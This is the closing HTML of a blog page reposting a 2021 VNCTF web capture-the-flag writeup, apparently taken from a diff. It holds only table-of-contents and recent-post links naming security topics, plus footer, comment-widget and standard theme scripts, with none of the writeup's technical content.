+<li>[3.3. fastjson &lt;1.2.68反序列化漏洞](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021">https://whoamianony.top/2021/03/15/CTF比赛记录/2021</a> VNCTF Web Writeup/#fastjson-lt-1-2-68反序列化漏洞)</li>
+</ol>
+</li>
+<li>[4. [VNCTF 2021]Easy_laravel](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021">https://whoamianony.top/2021/03/15/CTF比赛记录/2021</a> VNCTF Web Writeup/#VNCTF-2021-Easy-laravel)</li>
+</ol>
+<p>Recent Post</p>
+<p>[<img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210318152514.jpg" alt="浅谈 SESSION_UPLOAD_PROGRESS 的利用">](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/18/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88">https://whoamianony.top/2021/03/18/Web安全/浅谈</a> SESSION_UPLOAD_PROGRESS 的利用/)</p>
+<p>[浅谈 SESSION_UPLOAD_PROGRESS 的利用](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/18/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88">https://whoamianony.top/2021/03/18/Web安全/浅谈</a> SESSION_UPLOAD_PROGRESS 的利用/)2021-03-18</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317104025.jpg" alt="自主搭建的三层网络域渗透靶场打靶记录"></a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">自主搭建的三层网络域渗透靶场打靶记录</a>2021-03-15</p>
+<p>[<img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105006.jpg" alt="2021 VNCTF Web Writeup">](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021">https://whoamianony.top/2021/03/15/CTF比赛记录/2021</a> VNCTF Web Writeup/)</p>
+<p>[2021 VNCTF Web Writeup](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021">https://whoamianony.top/2021/03/15/CTF比赛记录/2021</a> VNCTF Web Writeup/)2021-03-15</p>
+<p>[<img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210318153722.jpg" alt="Redis 攻击方法总结">](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Redis">https://whoamianony.top/2021/03/13/Web安全/Redis</a> 常见攻击方法总结/)</p>
+<p>[Redis 攻击方法总结](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Redis">https://whoamianony.top/2021/03/13/Web安全/Redis</a> 常见攻击方法总结/)2021-03-13</p>
+<p>[<img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210209232129.jpeg" alt="Bypass Disable Functions">](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass">https://whoamianony.top/2021/03/13/Web安全/Bypass</a> Disable_functions/)</p>
+<p>[Bypass Disable Functions](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass">https://whoamianony.top/2021/03/13/Web安全/Bypass</a> Disable_functions/)2021-03-13</p>
+<p>©2019 - 2021 By Mr.Anonymous</p>
+<p>Framework <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>|Theme <a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></p>
+<p><a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.top/img/icp.png" alt="img">鲁ICP备2020039917号-1</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">upload</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://upload.love/2021/03/23/2021-VNCTF-Web-Writeup/">http://upload.love/2021/03/23/2021-VNCTF-Web-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://upload.love" target="_blank">upload</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/image/20210317105006.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/24/%E4%B8%80%E9%94%AEok/"><img class="prev-cover" data-lazy-src="http://image.nbd.com.cn/uploads/articles/images/673466/500352700_banner.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一键ok</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/22/D-3CTF-2021-non-rce/"><img class="next-cover" data-lazy-src="https://p3.ssl.qhimg.com/t01c7782eed070fa402.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">D^3CTF_2021-non rce</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">upload</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-VNCTF-Web-Writeup"><span class="toc-number">1.</span> <span class="toc-text">2021 VNCTF Web Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-Ez-game"><span class="toc-number">1.2.</span> <span class="toc-text">[VNCTF 2021]Ez_game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-realezjvav"><span class="toc-number">1.3.</span> <span class="toc-text">[VNCTF 2021]realezjvav</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%8A%B6%E6%80%81%E7%A0%81%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">基于状态码的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">笛卡尔积延时注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.3.</span> <span class="toc-text">fastjson &lt;1.2.68反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-Easy-laravel"><span class="toc-number">1.4.</span> <span class="toc-text">[VNCTF 2021]Easy_laravel</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计4"/></a><div class="content"><a class="title" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4">java代码审计4</a><time datetime="2021-11-08T08:49:09.000Z" title="发表于 2021-11-08 16:49:09">2021-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计3"/></a><div class="content"><a class="title" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3">java代码审计3</a><time datetime="2021-11-05T02:37:46.000Z" title="发表于 2021-11-05 10:37:46">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计2"/></a><div class="content"><a class="title" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2">java代码审计2</a><time datetime="2021-11-01T13:08:39.000Z" title="发表于 2021-11-01 21:08:39">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="东华杯"/></a><div class="content"><a class="title" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯">东华杯</a><time datetime="2021-11-01T04:27:51.000Z" title="发表于 2021-11-01 12:27:51">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计1"/></a><div class="content"><a class="title" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1">java代码审计1</a><time datetime="2021-10-31T08:49:36.000Z" title="发表于 2021-10-31 16:49:36">2021-10-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By upload</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://upload.love/2021/03/23/2021-VNCTF-Web-Writeup/'
+    this.page.identifier = '2021/03/23/2021-VNCTF-Web-Writeup/'
+    this.page.title = '2021-VNCTF-Web-Writeup'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
